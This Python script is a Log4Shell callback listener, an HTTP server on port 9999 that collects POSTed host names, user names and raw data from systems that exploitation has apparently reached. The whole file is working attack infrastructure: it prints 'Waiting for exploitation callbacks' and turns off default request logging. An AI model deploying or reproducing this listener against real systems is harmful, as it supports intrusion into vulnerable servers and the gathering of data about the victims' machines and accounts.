#!/usr/bin/env python3

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse
from datetime import datetime
from colorama import Fore, Style, init

init(autoreset=True)

class CallbackHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        if self.path.startswith("/callback"):
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode()
            
            params = parse_qs(post_data)
            
            print(f"\n{Fore.GREEN}[+] CALLBACK RECEIVED at {datetime.now()}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}    Host: {params.get('host', ['Unknown'])[0]}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}    User: {params.get('user', ['Unknown'])[0]}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}    Raw data: {post_data}{Style.RESET_ALL}")
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        pass  # Suppress default logging

def main():
    print(f"{Fore.RED}╔══════════════════════════════════════╗{Style.RESET_ALL}")
    print(f"{Fore.RED}║    Log4Shell Callback Listener       ║{Style.RESET_ALL}")
    print(f"{Fore.RED}╚══════════════════════════════════════╝{Style.RESET_ALL}")
    print(f"\n{Fore.CYAN}[*] Starting callback listener on port 9999...{Style.RESET_ALL}")
    
    server = HTTPServer(("0.0.0.0", 9999), CallbackHandler)
    print(f"{Fore.GREEN}[+] Listening for callbacks on http://0.0.0.0:9999/callback{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Waiting for exploitation callbacks...{Style.RESET_ALL}\n")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Shutting down listener...{Style.RESET_ALL}")

if __name__ == "__main__":
    main()